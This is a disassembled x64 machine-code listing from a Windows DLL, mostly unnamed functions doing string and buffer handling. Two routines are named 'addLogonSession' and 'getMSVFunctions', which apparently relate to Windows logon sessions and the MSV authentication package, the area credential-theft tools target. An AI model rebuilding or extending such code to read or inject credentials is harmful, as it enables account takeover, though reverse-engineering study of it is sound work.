mov ebx 0x3b
lea rcx [ rbp - 0x51 ]
cmp r8 rbx
cmova r8 rbx
lea rdx [ r8 + rdi ]
or r8 0xffffffffffffffff
call sub_1800024a0
lea rcx [ rbp - 0x51 ]
mov r8 rdi
xor edx edx
call sub_1800024a0
jmp r-xdata
lea rcx [ r--data ]
call sub_180016ebc
mov rcx [ rbp - 0x29 ]
call j_sub_180018b3c
jmp r-xdata
addLogonSession
push rbp
push rsi
push rdi
lea rbp [ rsp - 0x120 ]
sub rsp 0x220
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x100 ] rax
mov rdi rdx
mov rsi rcx
call sub_18000eb80
test al al
je r-xdata
mov rdx rdi
mov rcx rsi
call getMSVFunctions
jmp r-xdata
mov rax [ rdi ]
mov r8 [ rdi + 0x8 ]
mov [ rsp + 0x250 ] rbx
mov [ rsp + 0x218 ] r12
xor r12d r12d
mov [ rsp + 0x210 ] r13
mov r13d 0x7
mov [ rsp + 0x38 ] r12
mov [ rsp + 0x28 ] r12w
mov [ rsp + 0x40 ] r13
cmp rax r8
je r-xdata
mov rcx [ rbp + 0x100 ]
xor rcx rsp
call sub_180018450
add rsp 0x220
pop rdi
pop rsi
pop rbp
retn
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
mov r8d 0x72
call sub_1800023b0
mov rcx r8
mov rbx 0x6666666666666667
sub rcx rax
mov rax rbx
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx 0x4
jb r-xdata
mov r12 [ rsp + 0x218 ]
mov rbx [ rsp + 0x250 ]
mov r13 [ rsp + 0x210 ]
movzx eax dil
mov rcx [ rsp + 0x28 ]
call j_sub_180018b3c
cmp rdx 0x6
ja r-xdata
lea rdx [ r8 - 0x28 ]
lea rcx [ rbp + 0x18 ]
or r9 0xffffffffffffffff
xor r8d r8d
mov [ rbp + 0x30 ] r13
mov [ rbp + 0x28 ] r12
mov [ rbp + 0x18 ] r12w
call sub_180002260
lea edx [ r13 + 0x19 ]
lea rcx [ rsp + 0x50 ]
xor r8d r8d
mov [ rsp + 0x68 ] r13
mov [ rsp + 0x60 ] r12
mov [ rsp + 0x50 ] r12w
call sub_1800027d0
cmp [ rsp + 0x68 ] 0x8
mov rax [ r--data ]
lea rdx [ rsp + 0x50 ]
cmovae rdx [ rsp + 0x50 ]
lea rcx [ rbp - 0x38 ]
mov [ rdx ] rax
mov rax [ r--data ]
mov [ rdx + 0x8 ] rax
mov rax [ r--data ]
mov [ rdx + 0x10 ] rax
mov rax [ r--data ]
mov [ rdx + 0x18 ] rax
mov rax [ r--data ]
mov [ rdx + 0x20 ] rax
mov rax [ r--data ]
mov [ rdx + 0x28 ] rax
mov rax [ r--data ]
mov [ rdx + 0x30 ] rax
mov rax [ r--data ]
mov [ rdx + 0x38 ] rax
cmp [ rsp + 0x68 ] 0x8
mov [ rsp + 0x60 ] 0x20
lea rax [ rsp + 0x50 ]
cmovae rax [ rsp + 0x50 ]
cmp r13 0x8
mov [ rax + 0x40 ] r12w
movzx eax [ r--data ]
mov [ rbp - 0x38 ] r12w
mov [ rbp - 0x38 ] ax
cmovae rcx [ rbp - 0x38 ]
mov [ rbp - 0x48 ] r13
mov [ rbp - 0x50 ] r12
mov [ rbp - 0x60 ] r12w
mov [ rbp - 0x70 ] r13
mov [ rbp - 0x78 ] r12
mov [ rsp + 0x78 ] r12w
mov [ rbp - 0x20 ] r13
mov [ rbp - 0x28 ] 0x1
mov [ rcx + 0x2 ] r12w
mov r10 [ rdi ]
mov rcx [ rdi + 0x8 ]
mov rax rbx
mov [ rbp + 0x8 ] r13
sub rcx r10
mov [ rbp ] r12
mov [ rbp - 0x10 ] r12w
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
sub rdx 0x4
je r-xdata
lea rcx [ rbp - 0x10 ]
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx r10
call sub_180002260
mov edx 0x1
mov rcx rdi
call sub_180010e20
lea rcx [ rbp - 0x60 ]
or r9 0xffffffffffffffff
mov rdx rax
xor r8d r8d
call sub_180002260
mov edx 0x2
dec rdx
je r-xdata
mov rdx [ rsp + 0x40 ]
mov r9 [ rsp + 0x28 ]
mov r8 [ rsp + 0x38 ]
cmp rdx 0x8
lea rax [ rsp + 0x28 ]
lea rdi [ r--data ]
cmovae rax r9
cmp rdi rax
jb r-xdata
cmp [ rsp + 0x60 ] 0x20
jne r-xdata
mov edx 0x3
mov rcx rdi
call sub_180010e20
mov rdx [ rdi ]
or r9 0xffffffffffffffff
xor r8d r8d
cmp [ rax + 0x10 ] 0x20
jne r-xdata
dec rdx
jne r-xdata
mov ebx 0x3a
cmp rdx rbx
jae r-xdata
cmp rdx 0x8
lea rax [ rsp + 0x28 ]
cmovae rax r9
lea rax [ rax + r8 * 2 ]
cmp rax rdi
jbe r-xdata
mov rdx [ rsp + 0x40 ]
mov r9 [ rsp + 0x28 ]
mov r8 [ rsp + 0x38 ]
cmp rdx 0x8
lea rax [ rsp + 0x28 ]
lea rdi [ r--data ]
cmovae rax r9
cmp rdi rax
jb r-xdata
cmp [ rbp + 0x28 ] 0x20
jne r-xdata
lea rcx [ rbp - 0x38 ]
call sub_180002260
mov edx 0x1
mov rcx rdi
call sub_180010e20
lea rcx [ rbp - 0x10 ]
or r9 0xffffffffffffffff
mov rdx rax
xor r8d r8d
call sub_180002260
mov edx 0x2
mov rcx rdi
call sub_180010e20
lea rcx [ rbp - 0x60 ]
or r9 0xffffffffffffffff
mov rdx rax
xor r8d r8d
call sub_180002260
mov edx 0x3
jmp r-xdata
lea rcx [ rbp - 0x10 ]
call sub_180002260
mov edx 0x1
mov rcx rdi
call sub_180010e20
lea rcx [ rbp - 0x60 ]
or r9 0xffffffffffffffff
mov rdx rax
xor r8d r8d
call sub_180002260
mov edx 0x2
mov rcx rdi
call sub_180010e20
lea rcx [ rsp + 0x78 ]
or r9 0xffffffffffffffff
mov rdx rax
xor r8d r8d
call sub_180002260
mov edx 0x3
mov rcx rdi
call sub_180010e20
lea rcx [ rsp + 0x50 ]
jmp r-xdata
lea rdx [ rbp - 0x10 ]
lea rcx [ rbp - 0x38 ]
call sub_180010730
mov [ rsp + 0x20 ] rax
test eax eax
je r-xdata
lea rcx [ rbp - 0x38 ]
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx r10
call sub_180002260
lea edx [ r13 - 0x6 ]
mov rcx rdi
call sub_180010e20
lea rcx [ rbp - 0x10 ]
or r9 0xffffffffffffffff
mov rdx rax
xor r8d r8d
call sub_180002260
lea edx [ r13 - 0x5 ]
mov rcx rdi
call sub_180010e20
lea rcx [ rbp - 0x60 ]
or r9 0xffffffffffffffff
mov rdx rax
xor r8d r8d
call sub_180002260
lea edx [ r13 - 0x4 ]
mov rcx rdi
call sub_180010e20
lea rcx [ rsp + 0x78 ]
or r9 0xffffffffffffffff
mov rdx rax
xor r8d r8d
call sub_180002260
lea edx [ r13 - 0x3 ]
mov rcx rdi
call sub_180010e20
lea rcx [ rsp + 0x50 ]
jmp r-xdata
cmp rdx 0x8
lea rcx [ rsp + 0x28 ]
mov r8d 0x74
cmovae rcx r9
mov rdx rdi
call sub_180018670
cmp [ rsp + 0x40 ] 0x8
lea rax [ rsp + 0x28 ]
cmovae rax [ rsp + 0x28 ]
mov [ rsp + 0x38 ] rbx
mov [ rax + 0x74 ] r12w
lea rcx [ rsp + 0x28 ]
mov edx ebx
call sub_1800027d0
mov rdx [ rsp + 0x40 ]
mov r9 [ rsp + 0x28 ]
cmp rdx 0x8
lea rax [ rsp + 0x28 ]
cmovae rax r9
sub rdi rax
sar rdi 0x1
cmp r8 rdi
jae r-xdata
mov ebx 0x68
cmp rdx rbx
jae r-xdata
cmp rdx 0x8
lea rax [ rsp + 0x28 ]
cmovae rax r9
lea rax [ rax + r8 * 2 ]
cmp rax rdi
jbe r-xdata
mov rcx [ rbp - 0x50 ]
cmp rcx 0x18
ja r-xdata
mov rcx rdi
call sub_180010e20
lea rcx [ rsp + 0x78 ]
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rax
call sub_180002260
cmp [ rbp - 0x20 ] 0x8
mov [ rbp + 0x8 ] r13
mov [ rbp ] r12
mov [ rbp - 0x10 ] r12w
jb r-xdata
mov rcx [ rbp - 0x10 ]
call j_sub_180018b3c
mov ebx 0x3a
lea rcx [ r--data ]
call sub_180016ebc
cmp rdx 0x8
lea rcx [ rsp + 0x28 ]
mov r8d 0xd0
cmovae rcx r9
mov rdx rdi
call sub_180018670
cmp [ rsp + 0x40 ] 0x8
lea rax [ rsp + 0x28 ]
cmovae rax [ rsp + 0x28 ]
mov [ rsp + 0x38 ] rbx
mov [ rax + 0xd0 ] r12w
jmp r-xdata
lea rcx [ rsp + 0x28 ]
mov edx ebx
call sub_1800027d0
mov rdx [ rsp + 0x40 ]
mov r9 [ rsp + 0x28 ]
cmp rdx 0x8
lea rax [ rsp + 0x28 ]
cmovae rax r9
sub rdi rax
sar rdi 0x1
cmp r8 rdi
jae r-xdata
mov r9 [ rbp - 0x78 ]
cmp r9 0x18
ja r-xdata
cmp [ rbp - 0x70 ] 0x8
mov [ rbp - 0x20 ] r13
mov [ rbp - 0x28 ] r12
mov [ rbp - 0x38 ] r12w
jb r-xdata
mov rcx [ rbp - 0x38 ]
call j_sub_180018b3c
cmp [ rbp + 0x8 ] 0x8
jb r-xdata
mov ebx 0x68
jmp r-xdata
lea rcx [ r--data ]
call sub_180016ebc
test rcx rcx
jne r-xdata
cmp [ rbp - 0x48 ] 0x8
mov [ rbp - 0x70 ] r13
mov [ rbp - 0x78 ] r12
mov [ rsp + 0x78 ] r12w
jb r-xdata
mov rcx [ rsp + 0x78 ]
call j_sub_180018b3c
sub r8 rdi
lea rcx [ rsp + 0x28 ]
cmp r8 rbx
cmova r8 rbx
lea rdx [ r8 + rdi ]
or r8 0xffffffffffffffff
call sub_1800024a0
lea rcx [ rsp + 0x28 ]
mov r8 rdi
xor edx edx
call sub_1800024a0
jmp r-xdata
movzx eax [ rbp - 0x50 ]
lea rdx [ rcx + 0x1 ]
mov r9 rcx
add ax ax
lea r8 [ rbp - 0x60 ]
lea rcx [ rbp + 0xc8 ]
mov [ rbp + 0x50 ] ax
add ax 0x2
cmp [ rbp - 0x48 ] 0x8
cmovae r8 [ rbp - 0x60 ]
mov [ rbp + 0x52 ] ax
lea rax [ rbp + 0xc8 ]
mov [ rbp + 0x58 ] rax
call sub_180018f0c
mov r9 [ rbp - 0x78 ]
mov [ rbp + 0x58 ] r12
mov [ rbp + 0x50 ] r12d
jmp r-xdata
cmp [ rsp + 0x68 ] 0x8
mov [ rbp - 0x48 ] r13
mov [ rbp - 0x50 ] r12
mov [ rbp - 0x60 ] r12w
jb r-xdata
mov rcx [ rbp - 0x60 ]
call j_sub_180018b3c
movzx eax [ rbp - 0x78 ]
lea r8 [ rsp + 0x78 ]
lea rdx [ r9 + 0x1 ]
add ax ax
lea rcx [ rbp + 0x98 ]
mov [ rbp + 0x40 ] ax
add ax 0x2
cmp [ rbp - 0x70 ] 0x8
cmovae r8 [ rsp + 0x78 ]
mov [ rbp + 0x42 ] ax
lea rax [ rbp + 0x98 ]
mov [ rbp + 0x48 ] rax
call sub_180018f0c
mov [ rbp + 0x48 ] r12
mov [ rbp + 0x40 ] r12d
jmp r-xdata
test r9 r9
jne r-xdata
cmp [ rbp + 0x30 ] 0x8
mov [ rsp + 0x68 ] r13
mov [ rsp + 0x60 ] r12
mov [ rsp + 0x50 ] r12w
jb r-xdata
mov rcx [ rsp + 0x50 ]
call j_sub_180018b3c
lea rdx [ rbp + 0x70 ]
lea rcx [ rsp + 0x50 ]
call sub_1800105d0
lea rdx [ rbp + 0x60 ]
lea rcx [ rbp + 0x18 ]
call sub_1800105d0
lea rdx [ rbp + 0x40 ]
lea rcx [ rsp + 0x20 ]
mov r8d 0xb8
call [ rw-data ]
lea rcx [ r--data ]
lea rdx [ r--data ]
test eax eax
cmovns rdx rcx
or rcx 0xffffffffffffffff
xor eax eax
mov rdi rdx
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rcx [ rsp + 0x28 ]
call sub_1800023b0
jmp r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
mov r8d 0x1
call sub_180002150
lea rdx [ rsp + 0x28 ]
lea rcx [ rbp + 0x18 ]
or r9 0xffffffffffffffff
xor r8d r8d
mov [ rbp + 0x30 ] r13
mov [ rbp + 0x28 ] r12
mov [ rbp + 0x18 ] r12w
call sub_180002260
lea rdx [ rbp + 0x18 ]
mov rcx rsi
call sub_180001b10
cmp [ rsp + 0x40 ] 0x8
movzx edi al
jb r-xdata
mov rcx [ rbp + 0x18 ]
call j_sub_180018b3c
jmp r-xdata
sub_1800105d0
push rbp
push rsi
push rdi
sub rsp 0x160
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov [ rsp + 0x190 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x158 ] rax
mov rsi rdx
mov rdi rcx
lea rcx [ rsp + 0x30 ]
call sub_180005f70
nop
xor ebx ebx
test [ rdi + 0x10 ] 0xfffffffffffffffe
jbe r-xdata
lea rcx [ rsp + 0xc8 ]
call sub_180004400
lea r11 [ r--data ]
mov [ rsp + 0xc8 ] r11
lea rcx [ rsp + 0xc8 ]
call sub_180017208
mov rcx [ rsp + 0x158 ]
xor rcx rsp
call sub_180018450
mov rbx [ rsp + 0x190 ]
add rsp 0x160
pop rdi
pop rsi
pop rbp
retn
lea ebp [ rbx + 0x4 ]
nop [ rax + rax ] ax
mov rax [ rsp + 0x30 ]
movsxd rcx [ rax + 0x4 ]
and [ rsp + rcx + 0x48 ] 0xfffff9ff
or [ rsp + rcx + 0x48 ] 0x800
lea rdx [ rsp + 0x20 ]
lea rcx [ rsp + 0x30 ]
call sub_180010810
movzx r11d [ rsp + 0x20 ]
mov [ rsi + rbx ] r11b
inc rbx
mov rax [ rdi + 0x10 ]
shr rax 0x1
cmp rbx rax
jb r-xdata
mov rcx [ rsp + 0x130 ]
call j_sub_180018b3c
mov rax [ rsp + 0x30 ]
movsxd rcx [ rax + 0x4 ]
lea rcx [ rsp + rcx + 0x30 ]
xor edx edx
cmp [ rcx + 0x48 ] rdx
cmove edx ebp
xor r8d r8d
call sub_1800037f0
lea r8 [ rbx + rbx ]
mov r9d 0x2
lea rdx [ rsp + 0x130 ]
mov rcx rdi
call sub_180001f80
nop
mov rdx rax
lea rcx [ rsp + 0x40 ]
call sub_18000def0
nop
cmp [ rsp + 0x148 ] 0x8
jb r-xdata
sub_180010730
mov rax rsp
push rdi
sub rsp 0x130
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov rsi rdx
mov rbx rcx
xor edi edi
mov [ rax + 0x18 ] rdi
lea rcx [ rsp + 0x30 ]
call sub_180005f70
nop
mov rdx rbx
lea rcx [ rsp + 0x40 ]
call sub_18000def0
lea rdx [ rsp + 0x154 ]
lea rcx [ rsp + 0x30 ]
call sub_1800109c0
mov r11 [ rsp + 0x30 ]
movsxd rax [ r11 + 0x4 ]
lea rcx [ rsp + rax + 0x30 ]
mov eax 0x4
cmp [ rcx + 0x48 ] rdi
cmove edi eax
xor r8d r8d
mov edx edi
call sub_1800037f0
mov rdx rsi
lea rcx [ rsp + 0x40 ]
call sub_18000def0
lea rdx [ rsp + 0x150 ]
lea rcx [ rsp + 0x30 ]
call sub_180010b70
mov rbx [ rsp + 0x150 ]
lea rcx [ rsp + 0xc8 ]
call sub_180004400
lea r11 [ r--data ]
mov [ rsp + 0xc8 ] r11
lea rcx [ rsp + 0xc8 ]
call sub_180017208
mov rax rbx
lea r11 [ rsp + 0x130 ]
mov rbx [ r11 + 0x10 ]
mov rsi [ r11 + 0x18 ]
mov rsp r11
pop rdi
retn
sub_180010810
mov [ rsp + 0x8 ] rcx
push rbx
push rsi
push rdi
push r12
push r13
sub rsp 0x90
mov [ rsp + 0x48 ] 0xfffffffffffffffe
mov r13 rdx
mov rbx rcx
mov [ rsp + 0xd0 ] 0x0
mov [ rsp + 0x70 ] rcx
mov rax [ rcx ]
movsxd r8 [ rax + 0x4 ]
mov rcx [ r8 + rcx + 0x48 ]
test rcx rcx
je r-xdata
xor edx edx
mov rcx rbx
call sub_180004e60
mov [ rsp + 0x78 ] al
test al al
je r-xdata
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
add rcx rbx
mov eax [ rsp + 0xd0 ]
test eax eax
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
add rcx rbx
lea rdx [ rsp + 0x40 ]
call sub_180003910
nop
mov rcx rax
call sub_1800149c0
mov r12 rax
mov rsi [ rsp + 0x40 ]
test rsi rsi
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rbx + 0x48 ]
test rcx rcx
je r-xdata
mov edx [ rcx + 0x10 ]
or edx eax
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov rax [ rbx ]
movsxd rdx [ rax + 0x4 ]
add rdx rbx
mov [ rsp + 0x50 ] 0x0
mov [ rsp + 0x58 ] 0x1
mov rax [ rdx + 0x48 ]
mov [ rsp + 0x60 ] rax
test rax rax
sete [ rsp + 0x68 ]
movaps xmm0 [ rsp + 0x50 ]
movdqa [ rsp + 0x50 ] xmm0
movaps xmm1 [ rsp + 0x60 ]
movdqa [ rsp + 0x60 ] xmm1
mov rax [ r12 ]
mov [ rsp + 0x30 ] r13
lea rcx [ rsp + 0xd0 ]
mov [ rsp + 0x28 ] rcx
mov [ rsp + 0x20 ] rdx
lea r9 [ rsp + 0x50 ]
lea r8 [ rsp + 0x60 ]
lea rdx [ rsp + 0x80 ]
mov rcx r12
call [ rax + 0x48 ]
nop
jmp r-xdata
xor edx edx
lea rcx [ rsp + 0xd8 ]
call sub_18001775c
mov rax [ rsi + 0x8 ]
test rax rax
je r-xdata
mov rax rbx
add rsp 0x90
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
xor r8d r8d
call sub_1800037f0
nop
or edx 0x4
xor edi edi
cmp [ rsi + 0x8 ] rdi
cmove rdi rsi
lea rcx [ rsp + 0xd8 ]
call sub_18001778c
test rdi rdi
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rax [ rdi ]
mov edx 0x1
mov rcx rdi
call [ rax ]
nop
dec rax
mov [ rsi + 0x8 ] rax
sub_1800109c0
mov [ rsp + 0x8 ] rcx
push rbx
push rsi
push rdi
push r12
push r13
sub rsp 0x90
mov [ rsp + 0x48 ] 0xfffffffffffffffe
mov r13 rdx
mov rbx rcx
mov [ rsp + 0xd0 ] 0x0
mov [ rsp + 0x70 ] rcx
mov rax [ rcx ]
movsxd r8 [ rax + 0x4 ]
mov rcx [ r8 + rcx + 0x48 ]
test rcx rcx
je r-xdata
xor edx edx
mov rcx rbx
call sub_180004e60
mov [ rsp + 0x78 ] al
test al al
je r-xdata
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
add rcx rbx
mov eax [ rsp + 0xd0 ]
test eax eax
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
add rcx rbx
lea rdx [ rsp + 0x40 ]
call sub_180003910
nop
mov rcx rax
call sub_1800149c0
mov r12 rax
mov rsi [ rsp + 0x40 ]
test rsi rsi
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rbx + 0x48 ]
test rcx rcx
je r-xdata
mov edx [ rcx + 0x10 ]
or edx eax
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov rax [ rbx ]
movsxd rdx [ rax + 0x4 ]
add rdx rbx
mov [ rsp + 0x50 ] 0x0
mov [ rsp + 0x58 ] 0x1
mov rax [ rdx + 0x48 ]
mov [ rsp + 0x60 ] rax
test rax rax
sete [ rsp + 0x68 ]
movaps xmm0 [ rsp + 0x50 ]
movdqa [ rsp + 0x50 ] xmm0
movaps xmm1 [ rsp + 0x60 ]
movdqa [ rsp + 0x60 ] xmm1
mov rax [ r12 ]
mov [ rsp + 0x30 ] r13
lea rcx [ rsp + 0xd0 ]
mov [ rsp + 0x28 ] rcx
mov [ rsp + 0x20 ] rdx
lea r9 [ rsp + 0x50 ]
lea r8 [ rsp + 0x60 ]
lea rdx [ rsp + 0x80 ]
mov rcx r12
call [ rax + 0x40 ]
nop
jmp r-xdata
xor edx edx
lea rcx [ rsp + 0xd8 ]
call sub_18001775c
mov rax [ rsi + 0x8 ]
test rax rax
je r-xdata
mov rax rbx
add rsp 0x90
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
xor r8d r8d
call sub_1800037f0
nop
or edx 0x4
xor edi edi
cmp [ rsi + 0x8 ] rdi
cmove rdi rsi
lea rcx [ rsp + 0xd8 ]
call sub_18001778c
test rdi rdi
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rax [ rdi ]
mov edx 0x1
mov rcx rdi
call [ rax ]
nop
dec rax
mov [ rsi + 0x8 ] rax
sub_180010b70
mov [ rsp + 0x8 ] rcx
push rbx
push rsi
push rdi
push r12
push r13
sub rsp 0x90
mov [ rsp + 0x48 ] 0xfffffffffffffffe
mov r13 rdx
mov rbx rcx
mov [ rsp + 0xd0 ] 0x0
mov [ rsp + 0x70 ] rcx
mov rax [ rcx ]
movsxd r8 [ rax + 0x4 ]
mov rcx [ r8 + rcx + 0x48 ]
test rcx rcx
je r-xdata
xor edx edx
mov rcx rbx
call sub_180004e60
mov [ rsp + 0x78 ] al
test al al
je r-xdata
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
add rcx rbx
mov eax [ rsp + 0xd0 ]
test eax eax
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
add rcx rbx
lea rdx [ rsp + 0x40 ]
call sub_180003910
nop
mov rcx rax
call sub_1800149c0
mov r12 rax
mov rsi [ rsp + 0x40 ]
test rsi rsi
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rbx + 0x48 ]
test rcx rcx
je r-xdata
mov edx [ rcx + 0x10 ]
or edx eax
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov rax [ rbx ]
movsxd rdx [ rax + 0x4 ]
add rdx rbx
mov [ rsp + 0x50 ] 0x0
mov [ rsp + 0x58 ] 0x1
mov rax [ rdx + 0x48 ]
mov [ rsp + 0x60 ] rax
test rax rax
sete [ rsp + 0x68 ]
movaps xmm0 [ rsp + 0x50 ]
movdqa [ rsp + 0x50 ] xmm0
movaps xmm1 [ rsp + 0x60 ]
movdqa [ rsp + 0x60 ] xmm1
mov rax [ r12 ]
mov [ rsp + 0x30 ] r13
lea rcx [ rsp + 0xd0 ]
mov [ rsp + 0x28 ] rcx
mov [ rsp + 0x20 ] rdx
lea r9 [ rsp + 0x50 ]
lea r8 [ rsp + 0x60 ]
lea rdx [ rsp + 0x80 ]
mov rcx r12
call [ rax + 0x38 ]
nop
jmp r-xdata
xor edx edx
lea rcx [ rsp + 0xd8 ]
call sub_18001775c
mov rax [ rsi + 0x8 ]
test rax rax
je r-xdata
mov rax rbx
add rsp 0x90
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
xor r8d r8d
call sub_1800037f0
nop
or edx 0x4
xor edi edi
cmp [ rsi + 0x8 ] rdi
cmove rdi rsi
lea rcx [ rsp + 0xd8 ]
call sub_18001778c
test rdi rdi
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rax [ rdi ]
mov edx 0x1
mov rcx rdi
call [ rax ]
nop
dec rax
mov [ rsi + 0x8 ] rax
sub_180010d20
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov rdi rdx
mov rbx rcx
mov rcx [ rcx + 0x8 ]
cmp rdx rcx
jae r-xdata
cmp rcx [ rbx + 0x10 ]
jne r-xdata
mov rax [ rbx ]
cmp rax rdx
ja r-xdata
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rcx
test rcx rcx
je r-xdata
mov rcx rbx
call sub_180010e70
sub rdi rax
mov rax 0x2aaaaaaaaaaaaaab
imul rdi
mov rdi rdx
sar rdi 0x3
mov rax rdi
shr rax 0x3f
add rdi rax
cmp rcx [ rbx + 0x10 ]
jne r-xdata
add [ rbx + 0x8 ] 0x30
mov rbx [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
mov rax [ rdi ]
mov [ rcx ] rax
add rcx 0x8
mov [ rcx + 0x18 ] 0x7
xor eax eax
mov [ rcx + 0x10 ] rax
mov [ rcx ] ax
lea rdx [ rdi + 0x8 ]
call sub_180001fd0
nop
lea rdx [ rdi + rdi * 2 ]
shl rdx 0x4
add rdx [ rbx ]
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rcx
test rcx rcx
je r-xdata
mov rcx rbx
call sub_180010e70
jmp r-xdata
mov rax [ rdx ]
mov [ rcx ] rax
add rcx 0x8
mov [ rcx + 0x18 ] 0x7
xor eax eax
mov [ rcx + 0x10 ] rax
mov [ rcx ] ax
add rdx 0x8
call sub_180001fd0
nop
sub_180010e20
sub rsp 0x28
mov r10 [ rcx ]
mov r8 [ rcx + 0x8 ]
mov r9 rdx
sub r8 r10
mov rax 0x6666666666666667
imul r8
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx r9
ja r-xdata
lea rax [ r9 + r9 * 4 ]
lea rax [ r10 + rax * 8 ]
add rsp 0x28
retn
lea rcx [ r--data ]
call sub_180016ebc
sub_180010e70
sub rsp 0x28
mov r10 [ rcx ]
mov rdx [ rcx + 0x8 ]
mov r11 0x2aaaaaaaaaaaaaab
sub rdx r10
mov rax r11
mov r9 rcx
imul rdx
mov r8 rdx
sar r8 0x3
mov rax r8
shr rax 0x3f
add r8 rax
mov rax 0x555555555555554
cmp r8 rax
jbe r-xdata
mov rcx [ rcx + 0x10 ]
mov rax r11
inc r8
sub rcx r10
imul rcx
sar rdx 0x3
mov rax rdx
shr rax 0x3f
add rdx rax
cmp r8 rdx
jbe r-xdata
lea rcx [ r--data ]
call sub_180016e60
add rsp 0x28
retn
mov rcx rdx
mov rax 0x555555555555555
shr rcx 0x1
sub rax rcx
cmp rax rdx
jae r-xdata
add rdx rcx
mov rcx r9
cmp rdx r8
cmovb rdx r8
call sub_180011f80
xor edx edx
mov rcx r9
cmp rdx r8
cmovb rdx r8
add rsp 0x28
jmp sub_180011f80
sub_180010f30
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x7 ]
sub rsp 0xc8
mov [ rbp - 0x61 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x9 ] rax
mov [ rsp + 0x40 ] r9
mov r14 r8
mov r15 rdx
mov r12 rcx
mov rsi [ rbp + 0x6f ]
mov r13 [ rbp + 0x77 ]
mov rax [ rbp + 0x7f ]
mov [ rbp - 0x69 ] rax
or rdi 0xffffffffffffffff
mov rcx rsi
test [ rsi + 0x18 ] 0x4000
je r-xdata
xor ebx ebx
mov [ rsp + 0x30 ] ebx
lea rdx [ rbp - 0x79 ]
call sub_180003910
mov r11 rax
mov eax [ rsi + 0x18 ]
mov [ rsp + 0x28 ] r11
mov [ rsp + 0x20 ] eax
mov r9 [ rsp + 0x40 ]
mov r8 r14
lea rdx [ rbp - 0x59 ]
mov rcx r12
call sub_180012130
mov r8d eax
lea r9 [ rsp + 0x30 ]
lea rdx [ rbp - 0x71 ]
lea rcx [ rbp - 0x59 ]
call sub_180018158
mov r12d eax
mov rsi [ rbp - 0x79 ]
test rsi rsi
je r-xdata
lea rdx [ rsp + 0x38 ]
call sub_180003910
nop
mov rcx rax
call sub_1800090d0
mov [ rbp - 0x79 ] rax
xor ebx ebx
mov r12 [ rsp + 0x38 ]
test r12 r12
je r-xdata
lea rax [ rbp - 0x59 ]
cmp [ rbp - 0x71 ] rax
je r-xdata
xor edx edx
lea rcx [ rsp + 0x38 ]
call sub_18001775c
mov rax [ rsi + 0x8 ]
test rax rax
je r-xdata
mov [ rbp - 0x41 ] 0x7
mov [ rbp - 0x49 ] 0x1
mov [ rbp - 0x59 ] ebx
lea rdx [ rbp - 0x31 ]
mov r12 [ rbp - 0x79 ]
mov rcx r12
call sub_1800081e0
nop
mov r9 rdi
xor r8d r8d
mov rdx rax
lea rcx [ rbp - 0x59 ]
call sub_180002070
nop
cmp [ rbp - 0x19 ] 0x8
jb r-xdata
xor edx edx
lea rcx [ rsp + 0x30 ]
call sub_18001775c
mov rax [ r12 + 0x8 ]
test rax rax
je r-xdata
mov rdx [ rsp + 0x40 ]
mov rcx r14
call sub_180014f30
test al al
je r-xdata
cmp [ rsp + 0x30 ] 0x0
jne r-xdata
cmp [ rsi + 0x8 ] 0x0
cmove rbx rsi
lea rcx [ rsp + 0x38 ]
call sub_18001778c
test rbx rbx
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rax rdi
mov rcx [ rbp - 0x49 ]
sub rax rcx
cmp rax 0x1
ja r-xdata
mov rcx [ rbp - 0x31 ]
call j_sub_180018b3c
mov rsi rbx
cmp [ r12 + 0x8 ] rbx
